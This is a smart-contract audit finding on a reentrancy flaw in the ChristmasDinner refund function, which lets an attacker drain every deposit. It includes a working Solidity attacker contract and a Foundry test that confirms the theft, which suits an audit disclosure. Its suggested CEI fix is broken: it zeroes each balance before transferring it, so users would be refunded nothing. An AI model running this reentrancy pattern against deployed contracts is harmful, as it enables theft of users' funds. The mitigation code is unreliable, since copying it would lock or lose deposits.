### [H-08] reentrancy in `ChristmasDinner::refund()` draining all the funds in the contract

**Description:** 

reentrancy guard is not properly set in `ChristmasDinner::nonReentrant` modifier.

```javascript
    modifier nonReentrant() {
@>      require(!locked, "No re-entrancy");
        _;
        locked = false;
    }
```

Reentrancy is possible in `ChristmasDinner::refund()`, because effects are written after interactions and the reentrancy guard does not work.

```javascript
    function _refundERC20(address _to) internal {
@>      i_WETH.safeTransfer(_to, balances[_to][address(i_WETH)]);
        i_WBTC.safeTransfer(_to, balances[_to][address(i_WBTC)]);
        i_USDC.safeTransfer(_to, balances[_to][address(i_USDC)]);
        balances[_to][address(i_USDC)] = 0;
        balances[_to][address(i_WBTC)] = 0;
        balances[_to][address(i_WETH)] = 0;
    }
```

**Impact:**

High. All the funds can be stolen.

**Proof of Concept:**

Attacker contract:
```javascript
contract ChristmasDinnerReentrancyAttack {
    ChristmasDinner christmasDinner;
    ERC20Mock wbtc;
    uint256 depositAmount = 1e18;

    constructor(ChristmasDinner _christmasDinner, ERC20Mock _wbtc) {
        christmasDinner = _christmasDinner;
        wbtc = _wbtc;
        wbtc.approve(address(christmasDinner), 1e18);
    }

    receive() external payable {
        console.log(ERC20Mock(wbtc).balanceOf(address(christmasDinner)));
        if (
            ERC20Mock(wbtc).balanceOf(address(christmasDinner)) > depositAmount
        ) {
            christmasDinner.refund();
        }
    }

    function attack(address _token, uint256 _amount) external payable {
        christmasDinner.deposit(_token, _amount);
        christmasDinner.refund();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

Test function:
```javascript
function test_refundReentrancyAttack() public {
        uint256 wbtcAmount;
        vm.startPrank(user1);
        cd.deposit(address(wbtc), 1e18);
        wbtcAmount += 1e18;
        vm.stopPrank();
        vm.startPrank(user2);
        cd.deposit(address(wbtc), 2e18);
        wbtcAmount += 2e18;
        vm.stopPrank();
        vm.startPrank(user3);
        cd.deposit(address(wbtc), 1e18);
        wbtcAmount += 1e18;
        vm.stopPrank();

        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);

        ChristmasDinnerReentrancyAttack cdra = new ChristmasDinnerReentrancyAttack(
                cd,
                wbtc
            );
        wbtc.mint(address(cdra), 1e18);
        wbtcAmount += 1e18;
        console.log("wbtcAmount: ", wbtc.balanceOf(address(cdra)));
        cdra.attack(address(wbtc), 1e18);

        console.log("wbtcAmount: ", wbtc.balanceOf(address(cdra)));
        assertEq(wbtc.balanceOf(address(cdra)), 4e18);
    }
```

All the funds can be stolen from the contract.

**Recommended Mitigation:**

implement the reentrancy guard correctly:

```diff
    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
+       locked = true;
        _;
        locked = false;
    }
```

Also, a good practice is to write code following CEI, checks, effects, interactions:

```diff
    function _refundERC20(address _to) internal {
-       i_WETH.safeTransfer(_to, balances[_to][address(i_WETH)]);
-       i_WBTC.safeTransfer(_to, balances[_to][address(i_WBTC)]);
-       i_USDC.safeTransfer(_to, balances[_to][address(i_USDC)]);
        balances[_to][address(i_USDC)] = 0;
        balances[_to][address(i_WBTC)] = 0;
        balances[_to][address(i_WETH)] = 0;
+       i_WETH.safeTransfer(_to, balances[_to][address(i_WETH)]);
+       i_WBTC.safeTransfer(_to, balances[_to][address(i_WBTC)]);
+       i_USDC.safeTransfer(_to, balances[_to][address(i_USDC)]);
    }
```

Note: This error aplies to the contract tokens, but funds can be lost from ether too. Implement the necessary changes to cover all the funds.d